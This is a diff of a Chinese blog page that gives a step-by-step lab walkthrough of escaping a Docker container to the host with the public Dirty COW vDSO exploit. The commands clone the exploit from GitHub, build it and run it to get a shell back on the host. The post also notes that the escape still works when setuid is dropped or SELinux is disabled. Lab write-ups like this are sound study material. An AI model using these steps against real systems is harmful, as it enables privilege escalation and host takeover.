@@ -97,14 +97,20 @@
 <meta name="description" content="发表于 2018-07-20 | 分类于 hack | 阅读数测试环境虚拟机：ubuntu14.04，安装docker1、安装docker：1apt-get install docker.io 具体安装可见官方文档：https://docs.docker.com/install/linux/docker-ce/ubuntu/ 2、在docker中pull一个ubuntu:14.041docker">
 <meta property="og:type" content="article">
 <meta property="og:title" content="docker用脏牛逃逸到宿主机">
-<meta property="og:url" content="http://www.ksowo.com/2018/07/20/Docker用脏牛逃逸到宿主机/index.html">
+<meta property="og:url" content="http://www.ksowo.com/2018/07/20/docker用脏牛逃逸到宿主机/index.html">
 <meta property="og:site_name" content="Lyy&#39;s Blog">
 <meta property="og:description" content="发表于 2018-07-20 | 分类于 hack | 阅读数测试环境虚拟机：ubuntu14.04，安装docker1、安装docker：1apt-get install docker.io 具体安装可见官方文档：https://docs.docker.com/install/linux/docker-ce/ubuntu/ 2、在docker中pull一个ubuntu:14.041docker">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-02-22T10:13:29.778Z">
+<meta property="og:image" content="http://www.ksowo.com/images/blog/docker/1.png">
+<meta property="og:image" content="http://www.ksowo.com/images/blog/docker/2.png">
+<meta property="og:image" content="http://www.ksowo.com/images/blog/docker/3.png">
+<meta property="og:image" content="http://www.ksowo.com/images/blog/docker/4.png">
+<meta property="og:image" content="http://www.ksowo.com/images/blog/docker/5.png">
+<meta property="og:updated_time" content="2019-02-22T10:17:17.879Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="docker用脏牛逃逸到宿主机">
 <meta name="twitter:description" content="发表于 2018-07-20 | 分类于 hack | 阅读数测试环境虚拟机：ubuntu14.04，安装docker1、安装docker：1apt-get install docker.io 具体安装可见官方文档：https://docs.docker.com/install/linux/docker-ce/ubuntu/ 2、在docker中pull一个ubuntu:14.041docker">
+<meta name="twitter:image" content="http://www.ksowo.com/images/blog/docker/1.png">
 
 
 
@@ -133,7 +139,7 @@
 
 
 
-  <link rel="canonical" href="http://www.ksowo.com/2018/07/20/Docker用脏牛逃逸到宿主机/"/>
+  <link rel="canonical" href="http://www.ksowo.com/2018/07/20/docker用脏牛逃逸到宿主机/"/>
 
 
 
@@ -315,7 +321,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.ksowo.com/2018/07/20/Docker用脏牛逃逸到宿主机/">
+    <link itemprop="mainEntityOfPage" href="http://www.ksowo.com/2018/07/20/docker用脏牛逃逸到宿主机/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lyy">
@@ -409,10 +415,19 @@
         <p>发表于 2018-07-20 | 分类于 hack | 阅读数<br>测试环境虚拟机：ubuntu14.04，安装docker<br>1、安装docker：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure></p>
 <p>具体安装可见官方文档：<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p>
 <p>2、在docker中pull一个ubuntu:14.04<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:14.04docker images</span><br></pre></td></tr></table></figure></p>
-<p>看看已有容器<br>![]/images/blog/docker/1.png)<br>3、　接下来我们创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>看看已有容器</p>
+<p><img src="/images/blog/docker/1.png" alt=""></p>
+<p>3、　接下来我们创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure></p>
 <p>4、然后我们使用docker ps查看到该容器CONTAINER ID信息，接下来就使用docker attach进入该容器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach CONTAINER ID</span><br></pre></td></tr></table></figure></p>
-<p>![]/images/blog/docker/2.png)<br>5、安装编译软件，下载exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y build-essential</span><br><span class="line">apt-get install -y nasm</span><br><span class="line">apt-get install -y git</span><br><span class="line">git clone https://github.com/scumjr/dirtycow-vdso</span><br><span class="line">make</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure></p>
-<p>make完后在目录多出一个0xdeadbeef,执行命令：<br>./0xdeadbeef docker的IP:端口<br>![]/images/blog/docker/3.png)<br>等一会然后发现终端没输出了，在里面输入命令会有回显<br>![]/images/blog/docker/4.png)<br>对比IP地址，上图为宿主，下图为docker容器<br>![]/images/blog/docker/5.png)<br>6、提权原理可以看<br><a href="https://bbs.pediy.com/thread-220057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-220057.htm</a><br><a href="https://blog.csdn.net/enjoy5512/article/details/53196047" target="_blank" rel="noopener">https://blog.csdn.net/enjoy5512/article/details/53196047</a></p>
+<p><img src="/images/blog/docker/2.png" alt=""></p>
+<p>5、安装编译软件，下载exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y build-essential</span><br><span class="line">apt-get install -y nasm</span><br><span class="line">apt-get install -y git</span><br><span class="line">git clone https://github.com/scumjr/dirtycow-vdso</span><br><span class="line">make</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure></p>
+<p>make完后在目录多出一个0xdeadbeef,执行命令：<br>./0xdeadbeef docker的IP:端口</p>
+<p><img src="/images/blog/docker/3.png" alt=""></p>
+<p>等一会然后发现终端没输出了，在里面输入命令会有回显</p>
+<p><img src="/images/blog/docker/4.png" alt=""></p>
+<p>对比IP地址，上图为宿主，下图为docker容器</p>
+<p><img src="/images/blog/docker/5.png" alt=""></p>
+<p>6、提权原理可以看<br><a href="https://bbs.pediy.com/thread-220057.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-220057.htm</a><br><a href="https://blog.csdn.net/enjoy5512/article/details/53196047" target="_blank" rel="noopener">https://blog.csdn.net/enjoy5512/article/details/53196047</a></p>
 <p>7、用下面2中方式启动容器依然可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-drop setuid -itd zangniu:1 /bin/bash</span><br><span class="line">docker --selinux-enabled=false run -itd zangniu:1 /bin/bash</span><br></pre></td></tr></table></figure></p>
 
       
